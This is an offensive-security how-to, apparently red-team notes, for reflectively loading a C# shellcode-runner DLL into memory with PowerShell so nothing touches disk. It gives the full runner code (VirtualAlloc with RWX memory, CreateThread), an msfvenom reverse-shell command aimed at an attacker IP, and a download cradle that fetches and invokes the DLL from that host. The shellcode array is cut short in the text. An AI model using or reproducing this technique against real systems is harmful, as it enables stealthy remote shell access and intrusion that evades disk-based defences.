# ⭕ Powershell Reflective DLL Load

This technique will load a precompiled C# assembly directly into memory without touching the disk and execute a shellcode runner:

create a class library project in VS and paste this code:

```csharp
using System;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{
    public class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void runner()
        {

            // msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.1 LPORT=6969 exitfunc=thread  -f csharp -a x64
            byte[] buf = new byte[460] {

            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}

```

build the project and copy the compiled assembly to attacker machine and serve it with a web server:

```
python3 -m http.server
```

now download the DLL into memory and execute it with powershell:

```
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.56.1/ClassLibrary1.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```
